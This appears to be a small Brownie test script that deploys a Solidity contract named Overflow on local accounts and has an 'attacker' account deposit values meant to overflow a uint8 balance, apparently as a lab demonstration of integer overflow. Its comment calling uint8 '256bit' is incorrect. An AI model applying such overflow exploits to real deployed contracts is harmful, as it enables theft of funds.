from brownie import Overflow, accounts


def main():
    owner = accounts[0]
    attacker = accounts[3]

    overflow = Overflow.deploy({"from": owner})
    breakpoint()

    overflow.getMoney({"from": attacker})
    # it's a uint8 = 256bit
    overflow.addMoney(54, {"from": attacker, "value": 54})
    overflow.addMoney(255, {"from": attacker, "value": 255})
    overflow.addMoney(2, {"from": attacker, "value": 2})
